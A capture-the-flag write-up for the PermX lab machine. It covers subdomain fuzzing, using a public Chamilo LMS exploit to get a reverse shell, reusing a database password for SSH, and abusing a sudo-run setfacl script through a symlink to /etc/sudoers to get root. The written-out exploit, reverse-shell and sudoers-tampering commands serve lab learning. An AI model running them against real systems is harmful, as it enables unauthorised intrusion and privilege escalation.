We start with nmap showing us that there is a web server and an unknown port:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
4446/tcp open  n1-fwp?
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Add permx.htb in /etc/hosts file

There is an eLearning website with not much forms or other pages for user interaction.
Try to do some directory listing, we find some dirs but nothing interesting in there.
Let's try to check if some subdomain are used.

```
ffuf -u http://permx.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.permx.htb" -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 59ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 77ms]
:: Progress: [19966/19966] :: Job [1/1] :: 809 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

We found www and lms, add them to /etc/hosts and let's try to connect to them.
www seems to referencing to the primary website.
lms insteam took us to a login panel "chamilo"

Searching online we find a CVE related to chamilo:
https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS

In it we find a main.py, as explained in the github page we launch a scan:
python3 main.py -u http://lms.permx.htb -a scan

We got a "likely vulnerable", so we try the rev shell:

```
python3 main.py -u http://lms.permx.htb -a revshell
```

We start netcat on 443 and we continue the prompt of the revshell giving the info of the revshell ip and port.

And, here we go we have a rev shell!

Searching on internet we found that Chamilo's config file are located under Chamilo/app/, infact we found a configuration.php file with these juice info in:

```
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = '************';
$_configuration['db_user'] = '************';
$_configuration['db_password'] = '************';
// Security word for password recovery
$_configuration['security_key'] = '************';;

```

We notice also that there is a user called mtz:
```
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
```

After investigating on the www-data files we got to the point there is no other info usefull to make priv esc, so i got the idea of trying the "db_password" found before as ssh passw for user mtz and voilà we got the user!!

Now we are in with mtz user. Let's search for entry points to do priv esc.
We start linpeas and do some checks and we found out there is a script we can launch as root in /opt/acl.sh:

```
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi
```

```
/usr/bin/sudo /usr/bin/setfacl -m u: "$user":"$perm" "$target"
```

Basically, the script takes 3 input: the user, the permissions we want to set and the target file to which the permissions will be added.
The scripts does some check to prevent the input of target files out of mtz's home directory, and also check if the target it's a file.

I will be honest, it took me some times to understand how to bypass these checks, so try more times if you are stuck before giving up.

I created a symlink in /home/mtz pointing to /etc/sudoers:

ln -s /etc/sudoers /home/mtz/link

and started the script giving to mtz user wxr perms to the file the symlink is pointing to:

sudo /opt/acl.sh mtz rwx /home/mtz/link

Awesome! Now we can edit the /etc/sudoers in order to give to mtz user the permission to start /bin/bash as root:

# See sudoers(5) for more information on "@include" directives:

```
@includedir /etc/sudoers.d
mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl.sh
mtz ALL=(ALL:ALL) NOPASSWD: /bin/bash
```

Now we just launch sudo /bin/bash and we are root!!



